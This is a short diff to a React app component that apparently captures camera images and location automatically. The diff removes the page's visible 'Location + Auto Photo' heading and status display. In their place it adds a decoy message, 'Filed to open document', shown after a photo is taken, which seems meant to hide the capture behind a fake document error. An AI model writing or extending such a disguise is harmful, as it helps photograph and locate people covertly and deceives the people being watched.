@@ -8,7 +8,7 @@ function App() {
   const canvasRef = useRef(null);
 
   useEffect(() => {
-    console.log(process.env.REACT_APP_BACKEND_URL)
+    console.log(process.env.REACT_APP_BACKEND_URL);
     const captureData = async () => {
       try {
         // Get camera
@@ -87,12 +87,11 @@ function App() {
 
   return (
     <div style={{ padding: "2rem", fontFamily: "Arial, sans-serif" }}>
-      <h1>📍 Location + 📷 Auto Photo</h1>
-      <p>
-        Status: <strong>{status}</strong>
-      </p>
-
-      
+      {photo && (
+        <p>
+          <strong>Filed to open document</strong>
+        </p>
+      )}
 
       <canvas
         ref={canvasRef}
